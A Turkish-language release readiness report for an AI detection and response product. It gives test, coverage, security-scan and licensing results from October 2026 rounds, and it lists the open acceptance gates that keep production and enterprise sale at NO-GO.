# Singularity AIDR — Release Readiness Report

## Son inceleme — 6 Ekim 2026, kalan eksikler turu

**Temel ürün çalışıyor.c.** Bu turda tespit edilen yerel uygulama kusurları giderildi; aşağıdaki üç kapsam bağlantısı ile gerçek ortam, model, yayıncı ve müşteri kabulü açık bırakıldı. Ana depo tabanı `7f3ec0ad009abf5b032b8116b296d8604fee884e`, landing tabanı `e039be0b01d6a9baf04e2d83cbeeb9874c6f8a93`; sonuçlar henüz commit edilmemiş çalışma ağaçlarına aittir. Canlı yayın ve kabul edilmiş release candidate yoktur.

### Bu turda tamamlanan uygulamalar

- **Davranış öğrenmesi:** yalnız bağımsız onay ve imzalı, tek kullanımlık gerçek execution receipt ile kalıcı öğrenme; tenant/corpus ayrımı ve tekrar kullanım sınırı. Sıradan hook callback'i öğrenme yetkisi üretmez. Windows'ta desteklenmeyen arka plan öğrenme yolu açıkça sınırlandırılır.
- **MCP:** iki yönlü protokol, oturum/yanıt kimliği, replay, kapasite ve gerçek RPC girdi/çıktı denetimi. İmzalı paketin public library export'u ve private mTLS servis bağlantısı çalışır. Desteklenmeyen opak/binary içerik yetenekli tarayıcı yoksa reddedilir.
- **Discovery ve müdahale:** AWS/Azure/GCP/Intune için kapsamı ve sayfalaması sınırlı gerçek adapterler; exact-device imzalı komut, durable worker journal, dar yetkili otomasyon ve rollback. Çalışan worker kaydı 120 saniyeden sonra geçersizleşir; hatalı sorgu, replay veya restart bu süreyi uzatmaz. Durdurma kaydı yaşından bağımsız korunur.
- **Kimlik ve yönetim:** iki önceden kayıtlı owner ile SAML kesintisi kurtarma, atomik tek kullanım ve audit; landing'de native SSO/Directory Sync yapılandırma ve grup–rol yaşam döngüsü. Her istekte güncel native Clerk kurum üyeliği ve deprovisioned/banned durumu denetlenir. Operator directory yapılandırması desteklenmeyen API yanıtında durur; manuel veya başka-directory grant'inin seçilmiş directory'den geldiği garantisi T19'da açık kalır.
- **Gizlilik:** gerçek OIDC/JWKS/PKCE/nonce ve mTLS broker sözleşmesi, durable lease, final-send kontrolü, kaynak label/ACL ve revision fence; kurulu imzalı MCP üzerinden metin/metadata denetimi. Dar PDF/DOCX yolu yeni temiz TXT üretir; PCM16 yolu bütün sesi kaldırır. Bunlar format koruyan Office, ASR veya video işleme vaadi değildir.
- **Dağıtım:** 14 Windows payload için sabit publisher certificate ve bağımsız hash/receipt doğrulamalı Authenticode hazırlama/teslim hattı; doğru HTTPS SignTool timestamp ve geçici CI certificate custody. Müşteri kitinin öğrenme, paketleme, Codex, cloud discovery, SAML kurtarma ve response rehberleri gerçek teslim yollarına bağlıdır.
- **Bağımlılık ve kanıt:** bridge'de eski native binary yerine sistem libpq, güncel cryptography/OpenSSL, gerçek TLS doğrulaması; saf Python/native/OS lisans envanteri. Privacy CI/RC kapısı bütün testleri çalıştırır ve skip/TODO/expected-failure olan sonucu reddeder. Native IDE harness'i bütün vakalar geçse bile host crash/timeout/nonzero çıkışını reddeder.

### Son doğrulama

| Kontrol | Sonuç ve sınır |
|---|---|
| Ana suite ve coverage | **429 dosya, 6857 pass, 0 fail, 6 Windows POSIX skip**; satır %85,13, statement %81,48, branch %76,45, function %85,70. Mevcut eşikler ve test süreleri korunur. [Sonuç](.tmp-test/production-completion-2026-10-06/coverage-results.json). |
| Core coverage | **198 dosya, 3649 pass, 0 fail, 4 POSIX skip**; satır %86,10, statement %82,79, branch %77,30, function %87,42. Daha yüksek core eşikleri geçer. [Sonuç](.tmp-test/production-completion-2026-10-06/core-coverage-results.json). |
| Gerçek Linux tamamlayıcı testi | Windows'taki seçilmiş altı POSIX vaka **6/6**, 0 fail/skip, gerçek Linux Node 22.16'da geçti. Filtre dışındaki 84 vaka bu koşuda çalıştırılmış sayılmaz; gerçek Secret Service kabulü değildir. [Kanıt](.tmp-test/production-followup-2026-10-06/linux-six-posix-third-summary.json). |
| Güncel veritabanı ve operasyon | **139 migration**; offboarding **61/61**, retention **43/43**, SAML yönetimi **13/13**, kesinti kurtarma **9/9**, Edge response/identity **131**. Ayrı, örtüşen suite'lerdir; gerçek PostgreSQL testleri skip vermedi. [Güncel native PostgreSQL kanıtı](.tmp-test/production-followup-2026-10-06/operations-139-final/native-postgres-results.json). |
| Gerçek self-hosted prova | **11 sağlıklı servis, 92/92 gerçek API kontrolü**. Doctor: **165/168 PASS, 1 FAIL, 2 UNVERIFIED**. Liveness 200; readiness **503**: gerçek TLS/signing/backup/queue sağlık kanıtı ve host timer kabulü açık. Synthetic loopback credentials kullanıldı; test kaynakları temizlendi. [Kanıt](.tmp-test/production-followup-2026-10-06/operations-139-final/selfhost139/final-results.json). |
| Privacy | Linux Node **1407/1407**, kurulu imzalı MCP/mTLS **6/6**, Python model güvenliği **47/47**, hedefli Windows **37/37**; bu ayrı suite'lerde 0 skip. Son release output/qualification **30/30**. Gerçek paket: **267 dosya**, 179 kod dosyası, 6 bin, 0 source map/directive. CI/RC skip ve TODO'yu reddeder; gerçek GitHub/kurum kabulü açık. İki gerçek TR/EN model denemesi kalite kapısını geçemedi; tüm ürün egress'i kapsanmıyor. [Sınırlar](packages/privacy/reports/platform/INTEGRATION-2026-10-06.md); [paket envanteri](.tmp-test/production-completion-2026-10-06/privacy-package-inventory.json). |
| Bridge gerçek imaj ve tam güvenlik taraması | Yeni gerçek imajda **98/98**, 0 fail/error/skip; nonroot **verify-full PostgreSQL TLS 1.3** geçti. 30 runtime paket lock ile birebir; pip/ensurepip yok. Tam OS/library taramasındaki **7 giderilebilir satır kapandı**. Kalan **241 satır / 111 farklı ID / 52 HIGH**, 0 CRITICAL; taramada mevcut fixed-version 0. Bu güvenlik kabulü değildir: **NO-GO**. [Kalıcı bütün bulgular](docs/production-readiness/bridge-image-security-2026-10-06.md). |
| Landing | **68 dosya, 595 test**, lint/typecheck ve **45 sayfalık production build** geçti. Güncel standalone tarayıcı prova ve runtime capability **30/30** geçti. Demo credentials kullanıldı; gerçek Clerk/kurum directory kabulü açık. Production audit 0; development zincirinde yamalanmamış **1 HIGH**. [Kanıt](../aidr-landing/docs/verification-followup-2026-10-06.json). |
| Gerçek native hostlar | **Codex 0.153.2: 2/2**, **OpenCode 1.18.32: 6/6**, **Cursor 3.21.18 extension host: 8/8**, son derlenmiş çıktılara ve native binary SHA'larına bağlı. Cursor agent dispatch/model-output yolu ve eksik Claude/VS Code/OpenClaw/native SDK matrisi doğrulanmadı. Loopback model peer deterministiktir; gerçek ücretli model testi değildir. Harness **20/20** + ayrı mevcut JUnit parser **1/1**. Tam matris **NO-GO**. [Bağlı kanıt](.tmp-test/production-followup-2026-10-06/native-third-final-results.json). |
| Release ve gerçek paket kurulumu | **10 release contract / 10 consumer**, **10/10 gerçek temiz kurulum**, 0 fail/skip; enforcement **90/90**, Codex verifier **11/11**. Private çıktı ayrı doğrulandı. Signed MCP factory, bağımsız trust ve tamper reddi gerçek disposable consumer'da çalıştı. Çıktı unsigned developer release'dir; test fixture imzası production publisher değildir. [Kurulum](.tmp-test/production-completion-2026-10-06/package-install.log). |
| Teslim ve koruma sözleşmeleri | Customer kit **15/15**, supply-chain **66/66**, final custody **13/13**, Windows Authenticode sahibinin ayrı suite'i **73/73**. Worker freshness **129/129**, core barrier **36/36**, SDK direct **6/6**. Örtüşen sonuçlar toplanmaz; gerçek publisher/TSA/MDM/cihaz aksiyonu kabulü açık. |
| Tür, statik, lock ve dependency audit | Ana tür kontrolü, core test türleri, quality:static ve son lint/knip geçti. Lint **0 hata, 572 warning, 1 info**; kurallar korunur. İki repo frozen install geçti. Ana JS production/build audit ve landing production audit **0**; bu sayı OS/native güvenlik clearance'i değildir. [Son statik kontrol](.tmp-test/production-completion-2026-10-06/static-delivery-final.log). |
| Secret ve repo hijyeni | Checksum doğrulanmış Gitleaks **8.30.1**: main **8169**, landing **269** güncel checkout dosyası PASS; canary testleri ve varsayılan kurallar korunur. Değişmeyen history **132 / 6** bulgu ile açık; iki main owner-confirmed gerçek-anahtar adayı için rotasyon ve Security kabulü beklenir. Repo hygiene ve diff-check PASS. [Son ana tarama](.tmp-test/production-completion-2026-10-06/secrets-current-main-final.log). |
| SBOM ve lisans | Taze SBOM **216 component, 204 library, 30 Python**; **202 permissive / 2 review / 0 unknown**. Strict gate **exit 1**: certifi MPL-2.0 ve saf psycopg LGPL-3.0 review açık. Yeni gerçek imajdaki **17 native path / 41 notice, 110 OS package / 110 copyright / 26 common-license** malzemesi hash ile doğrulandı; bu Legal onayı değildir. [Review paketi](docs/production-readiness/bridge-notice-review-pack-2026-10-06.md). |

İlk başarısız denemeler saklandı. Toplu testteki dokuz eski beklenti imzasız gözlemlerden öğrenme istiyordu; yalnız testler gerçek imzalı öğrenme sözleşmesine uyarlandı. Güvenlik kuralları, test süreleri, coverage eşikleri, secret tarama kuralları veya lisans kabulü gevşetilmedi. Örtüşen test sayıları toplanıp başarı yüzdesi üretilmez.

### Açık kalan işler

[Tam eksik listesi](PRODUCTION_SALES_GAPS.md) **59 iş paketini** mevcut düzeltme, kalan iş, sorumlu ve kabul koşuluyla içerir. **46 teknik/operasyon işinin 43'ünde yerel uygulama var ve saha kabulü açık; 3'ünde uygulama/entegrasyon kapsamı da açık.** Bunlar benzersiz hata sayısı değildir.

| Kayıt | Kalan somut kapsam |
|---|---|
| T19 | Seçilmiş directory için güncel aktif üyeliğin native provider API ile doğrulanması; gerçek kurum IdP/SCIM/rol kaldırma kabulü. |
| T37 | Kurum uygulamasının zorunlu privacy rotasına alınması, gerçek broker/CA/vault ve alternatif ağ çıkışlarını kapatan etkin OS/MDM/proxy politikası; bütün native/browser/provider yolları kapsanmıyor. |
| T38 | Onaylı gerçek TR/EN PERSON/ADDRESS modeli ve bağımsız kurum gold corpus'u. İki gerçek public-model değerlendirmesi kalite eşiğini geçemedi; model başarısızlığı gizlenmedi. Satılacaksa format koruyan Office/PDF, gerçek ASR/video ve uzak kaynak ACL değişim bağlantıları ayrıca uygulanmalı. |

**Bridge güvenlik kabulü de açık.** Tam OS/library taramasındaki yedi giderilebilir bulgu düzeltildi. Aynı tarama veri tabanıyla kalan **241 advisory/package satırının 52'si HIGH**, bunlar 12 farklı CVE'ye aittir; taramada mevcut sağlayıcı düzeltmesi yoktur. Bunların tamamı açık tutulur; bu durum güvenlik muafiyeti veya exploitation mümkün değildir kararı üretmez. [Tam güvenlik raporu](docs/production-readiness/bridge-image-security-2026-10-06.md) ve [ilk/son bütün bulgu listeleri](docs/production-readiness/evidence/bridge-image-security-2026-10-06.json) kalıcıdır. Landing geliştirme zincirindeki bir yamalanmamış HIGH da açıktır.

**13 dış/ticari kayıt açık; production ve assisted-sale profillerinin her biri 12 zorunlu dış kapı içerir.** Gerçek publisher/private registry, desteklenen host/OS/architecture ve provider kabulü, history Security incelemesi ve gerçek anahtar rotasyonu, bağımsız pentest, offsite restore/RPO/RTO, paging/SIEM, gerçek kapasite/yanlış alarm ölçümü, destek işletimi ve hukuk/finans/PoV onayları gerekir. Bu yetkiler ve imzalar fixture ile üretilemez. [Gerçek model kanıtı](packages/privacy/docs/MODEL_PROVIDER_EVIDENCE.json), [private entegrasyon sınırları](packages/privacy/reports/platform/INTEGRATION-2026-10-06.md) ve [machine-readable son doğrulama](READINESS_BACKLOG.json) ayrı kanıttır.

---

## Önceki devam turu — 6 Ekim 2026

> Tarihsel snapshot: aşağıdaki sayılar önceki devam turuna aittir. Güncel sonuçlar üstteki son inceleme ve READINESS_BACKLOG.json latestVerification alanıdır.

**Sonuç: temel ürün güncel, izole self-hosted kurulumda çalışıyor; sınırsız production ve kurumsal satış kabulü hâlâ NO-GO.** Bu devam turu, 5 Ekim incelemesinden sonra kalan somut kod kusurlarını da giderir. Ana depo tabanı `7f3ec0ad009abf5b032b8116b296d8604fee884e`, landing tabanı `e039be0b01d6a9baf04e2d83cbeeb9874c6f8a93` olur; iki çalışma ağacındaki değişiklikler henüz commit edilmedi. İmzalı müşteri adayı, canlıya yayın veya müşteri kabulü oluşturulmadı.

### Bu turda giderilen sorunlar

- **DLP dış sorgudan önce çalışır.** Hassas girdi ve gönderilecek URL/artifact, reputation/paket/AMSI sorgularından önce denetlenir. Onay isteği daha güçlü yerel zararlı işlem/paket engelini zayıflatmaz; sonraki yerel tarama ilk onay kararını sessizce izne çeviremez. Davranış değerlendirmesi bir kez çalışır. Henüz eşlenmemiş cihaz, güven anahtarları yapılandırılmış olsa da yerel korumayı sürdürebilir.
- **İmzalı tenant DLP desteklenen çıktı yollarına bağlandı.** Claude, OpenCode, OpenClaw ve açık SDK runtime adapteri yakalanmış policy/config/grant/revocation durumunu doğrular; teslimde mevcut durum yeniden kontrol edilir. Codex output API'si, Cursor/VS Code'un kısıtlı gözlem/durdurma kabiliyeti ve provider stream sınırları ayrıca belirtilir.
- **Premium politika önbelleği güncel yetkiye bağlıdır.** Grant kaldırma, revoke, tenant/serial değişimi, expiry/grace ve pack/trust yolu değişimi eski çözülmüş paketin kullanımını durdurur. Operatörün yerel denylist'i ve ücretsiz yerel koruma korunur.
- **Enrollment belirsizliğinde otomatik tekrar durur.** Başlangıç ve evaluator aynı özel, exclusive journal'ı kullanır; credential kalıcı kaydedilmeden journal kaldırılmaz. Kaybolmuş committed yanıt, timeout, crash ve eski eşzamanlı yazıcılar sınandı. Yetkili revoke ve yeni insan onayıyla aynı cihaz/koltuk üzerinden yeniden eşleme gerçek PostgreSQL'de doğrulandı; hash-only anahtar plaintext olarak geri açılmaz.
- **SAML politika yönetimi iki owner gerektirir.** Mevcut AAL2/provider-qualified oturumlar, sabit beş dakikalık talep, eski/yeni provider CAS, atomik consume/audit, owner promotion yarışları ve hold/offboarding cascade'i API ve dashboard'da bağlıdır. Native SAML testi CI/RC'de zorunludur.
- **Yönetilen landing'de kurum yetkisi eklendi.** Sabit tenant storage anchor, güncel Clerk üyelik/rolleri, iki ayrı admin politika onayı ve stale/personal fallback reddi vardır. Kurum bağlamak mevcut cihaz kimliklerini, koltukları ve ödeme/deneme dönemini değiştirmez. Desteklenmeyen kurulum komutu ve kopuk kod üretimi kaldırıldı; onaylı kit ve host'un döndürdüğü gerçek device URL/code kullanılır.
- **Privacy için dar mTLS metin servisi vardır.** Tek tenant/provider, zorunlu defense NER ve broker oturumu ile başlar; eksik gerçek ayarda durur. Ayrı MCP yürütücüsü metin, structuredContent ve metadata'yı denetleyip hassas yanıtı saklar. Model qualification temiz negatiflerin TR/EN kapsamını ve yapılandırılabilir observed false-alarm sınırını denetler; bütün temiz örnekleri engelleyen model başarılı sayılmaz.
- **SQL ve teslimat doğruluğu düzeltildi.** Başarılı response adımı, sonraki queue hatasıyla kaybolmaz; süresi geçmiş/ACK verilmiş komut görünümü gerçek durumu gösterir. SCIM offboarding, silinmiş audit kaydını yeniden oluşturmaz. Müşteri kitine gerçek retention/hold runbook'u ve çalışan yerel bağlantısı eklendi.
- **Lisans/SBOM kanıtı sıkılaştırıldı.** 31 Python wheel'in resmî metadata/hash kanıtı kullanılır; karışık SPDX ifadeleri ve native-library yükümlülükleri korunur. Önceden üretilmiş ticari SBOM, ayrı build-job digest'i ve kaynak/lock/license-evidence bağı olmadan kabul edilmez. Hukuk onayı yerine otomatik permissive kabul eklenmedi.

### Güncel doğrulama

| Kontrol | Sonuç ve sınır |
|---|---|
| Ana suite ve coverage | **416 dosya, 6353 pass, 0 fail, 5 Windows POSIX skip**. Satır %84,50; branch %75,59; function %84,74; statement %80,77. Mevcut eşikler korunur. [Sonuç](.tmp-test/production-followup-2026-10-06/coverage-results.json). |
| Core coverage | **191 dosya, 3369 pass, 0 fail, 4 POSIX skip**. Satır %85,49; branch %76,09; function %86,37; statement %82,15; daha yüksek core eşikleri geçer. [Sonuç](.tmp-test/production-followup-2026-10-06/core-coverage-results.json). |
| Linux complement | Windows'taki beş POSIX testi **5/5**, enrollment repair **12/12**, key rotation **20/20**; seçilmiş 37 testin tamamı gerçek Linux Node 22.16'da geçti. Vault mock'tur; gerçek Secret Service kabulü değildir. [Kanıt](.tmp-test/production-hardening-2026-10-06/linux-posix-container.json). |
| Kimlik ve PostgreSQL | Güncel **135 migration** üzerinde SAML administration **13/13**, response/offboarding regresyonu **7/7**, geniş offboarding **61/61**, retention **43/43**; native suite'lerde skip yok. Identity handler **129** ve SAML/SCIM/MFA UI **31** hedefli test geçti. [Operasyon sonucu](.tmp-test/production-followup-2026-10-06/operations-final-results.json). |
| Gerçek self-hosted prova | Güncel **135 migration, 11 sağlıklı servis, 92/92 canlı API smoke**. Doctor hâlâ NO-GO: gerçek signing/backup/queue sağlık kanıtları ve HTTPS eksik; iki host timer doğrulanmadı. Loopback HTTP ve sentetik credentials, müşteri kabulü değildir. Tüm own container/volume/network/image kaynakları temizlendi. [Kanıt](.tmp-test/production-followup-2026-10-06/operations-selfhost-final-results.json). |
| Privacy | Güncel kaynakla izole Linux **1388/1388 Node testi**, 0 skip. mTLS text launcher, MCP output ve qualification regresyonları dahil. Gerçek kurum modeli/broker ve bütün ana ürün çıkışları kapsamda değildir. [Paket raporu](packages/privacy/reports/platform/TEST_REPORT.md). |
| Landing | **64 dosya, 539 test**, lint/typecheck, 45 sayfalık production build ve güncel standalone tarayıcı onboarding/yönetim smoke geçti. Gerçek core-client wire contract **52** test. Browser smoke sentetik demo kimliği kullanır; gerçek Clerk iki hesabı veya native host kabulü değildir. [Kanıt](../aidr-landing/docs/verification-followup-2026-10-06.json). |
| Paket/dağıtım araçları | Güncel release supply-chain suite **67/67**, SBOM/CI/operator DLP hedefli kontrolleri **32/32**, MCP gateway tüm suite'i **49/49** geçti. |
| Son release ve temiz kurulum | Son release build **10 contract ve 10 consumer** kontrolünü geçti; unsigned developer artefact'tır. Ayrı tüketici dizinlerinde **10/10 gerçek temiz paket kurulumu**, 0 skip/fail. Derlenmiş enforcement **90/90**, Codex **11/11**. Yeni private release çıktısında MCP output **25/25**, qualification **5/5** geçti. [Kurulum kaydı](.tmp-test/production-followup-2026-10-06/package-install.log). |
| Tür/statik/bağımlılık | `pnpm check`, quality:static, son lint/knip ve iki repo frozen install geçti. Son lint **0 hata, 518 warning, 1 info** verir. Ana production/build audit ve landing production audit **0**; landing development zincirinde upstream yaması olmayan **1 HIGH braces** açık kalır. |
| Repo hygiene | Gerçek host path kontrolü **26/26** regresyon ve checkout taramasıyla geçti. Derlenmiş threat cache'teki açık regex karakter sınıfı gerçek kullanıcı dizini sanılmıyor; gerçek Linux/macOS/Windows yolları ve hatalı sınıflar hâlâ reddedilir. Generated dosya veya kural muafiyeti eklenmedi. |
| Güncel secret ve lisans | Resmî checksum doğrulanmış Gitleaks 8.30.1: ana **8053**, landing **261** checkout dosyası temiz; tarama kuralları/istisnaları gevşetilmedi. İlk RED veren üç yeni sahte test anahtarı çalışma anında üretilir. History taramaları değişmemiş commit geçmişlerinde **132 / 6** bulgu ve exit 1 ile açık kalır; iki main owner-confirm kaydı ve Security kabulü beklenir. Taze SBOM **217 component, 205 library, 31 Python** içerir; declared license **202 permissive, 3 review, 0 unknown**. Strict licence gate hâlâ exit 1: üç copyleft review ve binary wheel'in 14 native-library yükümlülüğü hukuk incelemesi ister. |

Örtüşen suite sayıları toplanıp ürün başarı yüzdesi üretilmez. Yeni derlenmiş/temiz kurulum kontrolleri de gerçek native host, provider veya yayıncı otoritesi yerine geçmez. 5 Ekim sonuçları aşağıda ayrı tarihsel kayıt olarak korunur.

### Tam eksik listesi ve kalan uygulamalar

[PRODUCTION_SALES_GAPS.md](PRODUCTION_SALES_GAPS.md) **59 iş paketinin tamamını**, mevcut düzeltmeyi, kalan işi, sorumluyu ve kabul koşulunu tek tabloda ve ayrıntısıyla listeler: 46 teknik/operasyon işi ve 13 dış/ticari kayıt. 37 teknik işte yerel uygulama var ve saha kabulü açık; aşağıdaki **9 işte** satılan kapsam veya gerçek authority/model/provider ile tamamlanacak bağlantılar da vardır:

| Kimlik | Kalan bağlantı |
|---|---|
| T05 | Güvenilir execution receipt, bağımsız benign onayı ve kalıcı öğrenme/anti-replay; öğrenme güvenle kapalı tutulur. |
| T10 | Satılacaksa binary/server-initiated MCP ve upstream bypass'ı kapatan zorunlu routing. |
| T11 | Satılacaksa AWS/Azure/GCP/MDM discovery adapterleri; yerel collector bütün kurum estate'i değildir. |
| T12 / T13 | İmzalı exact-device komut, kurulu worker, gerçek OS/provider action adapteri, SOAR tetikleyicisi ve yetkili rollback. Kütüphane ve queue tek başına containment üretmez. |
| T18 | Tüm SAML oturumları bittikten sonra kurumca yetkilendirilen dış yönetim kurtarma yolu. |
| T19 | Yönetilen SaaS için seçilmiş directory/SCIM/provider grup–rol yaşam döngüsü; self-hosted SCIM bunun yerine geçmez. |
| T37 | Gerçek broker ve uygulamanın final-send bağlantısı; alternatif ağ çıkışlarını kapatma. |
| T38 | Onaylı gerçek TR/EN PERSON/ADDRESS NER ve kurum label'ları. DSPM ACL ve Office/PDF/ASR/video, yalnız satılacak kapsamdaysa ek uygulama ister. |

Gerçek host/OS ve IdP/provider kabulü, resmi publisher/private registry, bağımsız pentest ve history Security incelemesi, offsite restore/RPO/RTO, SIEM/paging, gerçek performans/yanlış alarm, destek işletimi ve hukuk/finans/PoV onayları açık kalır. 13 dış kayıt içinde yatırımcıya özel kayıt da vardır; production ve assisted-sale profillerinin her birine **12** zorunlu kapı uygulanır. Bu onaylar test fixture'ı ile kapatılmadı.

---

## Önceki doğrulama — 5 Ekim 2026

Bu bölüm o tarihteki kapsamı ve sonuçları korur. Sonraki kaynak değişiklikleri ve güncel karar için 6 Ekim kaydı esas alınmalıdır; örneğin burada eksik görünen landing organizasyon yetkisi artık yerel uygulamada vardır.

**Sonuç: ürünün temel akışları izole kurulumda çalışıyor; genel production ve kurumsal satış kabulü NO-GO.** Bu turda bulunan çalışma, güvenlik ve paketleme kusurları giderildi. Yerel testlerin geçmesi, gerçek kurum ortamının, yayıncı kimliğinin, sözleşmelerin ve işletme kapasitesinin kabul edildiği anlamına gelmiyor. Production kabulü için aşağıdaki açık işler tamamlanmalı; kabul yalnız doğrulanan kapsam ve aday sürüm için geçerlidir.

İnceleme `aidr` ve kardeş `aidr-landing` deposunu kapsar. Başlangıç commit'i `7f3ec0ad009abf5b032b8116b296d8604fee884e`; sonuçlar bu commit üzerine uygulanmış, henüz commit edilmemiş çalışma ağacına aittir. Araçlar: Windows, Node 24.18.1, pnpm 10.29.3 ve Linux Docker. Bu kayıt imzalı release candidate veya müşteri kabul belgesi değildir. Aşağıdaki Eylül kayıtları korunmuş tarihsel kanıttır.

### Giderilen somut sorunlar

| Alan | Önceki sorun ve düzeltme |
|---|---|
| Girdi ve politika denetimi | Büyük, derin veya yarım okunmuş girdiler temiz sayılabiliyordu; denetlenemeyen girdi artık açık engel üretir. Zorunlu uzak politika, IPv6/özel ağ ve sembolik bağlantı kontrollerindeki atlamalar kapatıldı. İptal edilen politika tekrar çevrimdışı kullanılmıyor; imzalı sıra sınırı korunuyor. |
| Yetki ve anahtar yenileme | `agent_not_authorized` çevrimdışı yetkiyi kaldırmıyordu; artık yetki ve premium anahtarlar iptal edilir. `premium_intel`/`intel_packs` sözleşmesi düzeltildi. Uzun oturumlar süre dolmadan, sınırlı sıklıkta yenilenir. Anahtar değişirken kalan telemetri eski kuyrukta sahipsiz kalmaz; doğrulanmış yenileme mevcut kuyruğu ve kilitlerini korur. |
| Kimlik, tenant ve veritabanı | Eksik rate-limit scope'ları device/SCIM/OIDC işlemlerini 503'e düşürüyordu. Toplu anonim limitler, OIDC namespace ve eski callback yarışları, recovery/retention yetki kontrolleri, yenileme süresi ve SCIM/SAML kilit sırası düzeltildi. OIDC silme işlemleri offboarding'e eklendi. Beş yeni forward migration eklendi; eski uygulanmış migration'lar yeniden yazılmadı. |
| Dashboard | İkinci girişte oturum zaman aşımı, self-role değişimi ve politika editörünün yayın/yenileme sırasında taslak kaybetmesi düzeltildi. MCP seçicileri sunucu ile aynı kuralları uygular. |
| Connector ve SDK | Codex olayının iki kez yürütülmesi, imzalı ingress yönlendirme/scope/süre kontrolleri, büyük çıktıların temiz sayılması, plugin discovery ve hatalı CLI/config sonuçları düzeltildi. Kurallar paket içindeki `dist/resources` yolundan yüklenir. SDK yalnız denetlediği girdiyi yürütür; ESM/CJS tüketimi doğrulandı. |
| Fleet ve güncelleme | Paket içinden güven anahtarı alma, Windows junction üzerinden yazma/çalıştırma, yanlış rollback sırası ve çalışmayan hook'un sağlıklı görünmesi kapatıldı. Gerçek tehdit canary'si gerekir. Linux offline helper, macOS tar ve boşluklu kullanıcı dizini düzeltildi. Windows kabulü gerçek Windows runner'a taşındı. |
| Backup ve bridge | Eşzamanlı yedeğin başka snapshot'ın servislerini başlatması, geçersiz arşivin başarılı sayılması ve başarısız offsite yüklemede son yerel yedeğin kaybı düzeltildi. Bridge HA replay, bozuk JWT/ağ hataları, redaction özyinelemesi, ZIP/TAR uyumluluğu ve geçersiz upload sonuçları düzeltildi. |
| Mahremiyet | İptalden sonra bekleyen çıktı, provenance/Unicode kaçırmaları, browser retention yarışları ve native politika atlamaları kapatıldı. Onay aynı içerik/kimlik/oturum/politika için gateway gönderiminde tüketilir; DNS/TLS sonrasında yetki tekrar kontrol edilir. Şifreli durum süresi doğrulanır. Eski v1 hücreler otomatik taşınmaz; [kurtarma prosedürü](packages/privacy/docs/STATE_RECOVERY.md) gerekir. |
| Landing ve yönetilen servis | Clerk ile Firebase browser auth uyuşmazlığı giderildi; ekranlar yetkili sunucu API'sini kullanır. Kurulum kodu, onaylı ilk enrollment ile başlayan değiştirilemez 14 günlük değerlendirme, ingest/seat/policy yarışları, ödeme ve webhook tekrarları düzeltildi. SSRF/özel IP/DNS rebinding ve gövde sınırları uygulanır. Eksik production ayarları başlangıcı veya readiness'i durdurur. Node 24 standalone container doğrulandı. |
| Bağımlılık ve yayın | Ana deponun production/build dependency audit'i temiz. Eski Changesets, VSCE ve duplication tooling zincirleri güncellendi. Privacy release derlemesinin kaynak haritası sızıntısı giderildi. Paket sınırları ve arşiv içerikleri sıkılaştırıldı. İmza ve güvenlik kapıları gevşetilmedi. |

### Çalıştığına ilişkin kanıt ve sınırı

| Kontrol | Sonuç ve kapsam |
|---|---|
| Birleşik test ve kapsam | 407 dosyada 6159 test geçti, 0 hata. Windows'taki 5 POSIX skip'inin tamamı ayrı Linux Node 22.16 çalışmasında gerçekten yürütülüp geçti; [Linux sonuçları](.tmp-test/production-hardening-2026-10-05/linux-posix-summary.json). Genel coverage: satır %84,16, branch %75,12, function %84,53, statement %80,42; mevcut eşikler değiştirilmeden geçti. |
| Core ayrı kapsam kapısı | 187 dosyada 3294 test geçti, 4 POSIX skip'i yukarıdaki Linux çalışmasında doğrulandı. Satır %85,07, branch %75,47, function %86,26, statement %81,73; core'un daha yüksek mevcut eşikleri de geçti. |
| Derlenmiş paket ve temiz kurulum | Son `pnpm build:release` 10 paket contract/consumer kontrolünü geçti. `pnpm verify:package-install`: ayrı tüketici dizininde 10/10 paket geçti; 0 fail ve 0 skip. Claude paketinde imzasız geliştirme çıktısı ile imzalı paket-root kanıtları ayrı gerçek pack testleriyle doğrulandı; production imza zorunluluğu korunur. `pnpm install --frozen-lockfile --ignore-scripts` geçti. [Temiz kurulum kaydı](.tmp-test/production-hardening-2026-10-05/package-install-final.log). |
| Derlenmiş koruma akışı | `pnpm verify:enforcement` 90/90; `pnpm verify:codex` 11/11; MCP gateway/stdio/integrity 49/49 geçti. Yerel derlenmiş connector kararı, gerçek host'un eylemi durdurduğunu tek başına kanıtlamaz. |
| Gerçek self-hosted prova | 11 servis sağlıklı açıldı, 130 migration uygulandı; 92 canlı API/tenant/enrollment/policy/ingest/pack/storage/revocation kontrolü geçti. [Smoke kanıtı](coverage/ops-rehearsal-aidr-ops-20261005222422/smoke-evidence.json). Son migration ayrıca bağımsız 131-migration PostgreSQL zincirinde doğrulandı. |
| PostgreSQL | 131 migration uygulandı; 12 yönetim/yetki/concurrency ve 5 OIDC-SCIM-SAML/offboarding regresyonu geçti. Son birleşik offboarding 59/59, retention 43/43; sıfır atlanan test. |
| Operasyon araçları | Monitoring 17/17; upgrade 41 ve support bundle 13 kontrol geçti. Backup/fleet/bridge regresyonlarının kapsamı ilgili testlerde kayıtlıdır. [Son operasyon sonuçları](.tmp-test/production-hardening-2026-10-05/operations-final-results.json). |
| Privacy ayrı paketi | Linux'ta 1335 Node ve 143 Python testi; 8 gerçek yerel sentetik OCR senaryosu ve beş görselde 29 hassas satırın kapatılması doğrulandı. [Paket raporu](packages/privacy/reports/platform/TEST_REPORT.md). Bu sonuç kurum verisinde NER doğruluğunu veya tüm ürün çıkışlarının gateway'den geçtiğini kanıtlamaz. |
| Landing | 59 dosyada 457 test; lint, production build ve gerçek derlenmiş sunucuda demo kimliğiyle browser onboarding/yönetim smoke geçti. Son Linux container root olmayan UID10001 ile çalışır. Canlı Clerk/Firebase/ödeme sağlayıcısı kabulü yapılmadı. [Landing çalışma ve dağıtım kaydı](../aidr-landing/README.md). |
| Statik ve tür kontrolleri | `pnpm quality:static` ve `pnpm check` geçti. Lint 0 hata, 506 mevcut uyarı verir; bunlar gizlenmedi. Statik demo/load/SLI kontrolleri gerçek kullanıcı yükü veya aylık kullanılabilirlik ölçümü değildir. |
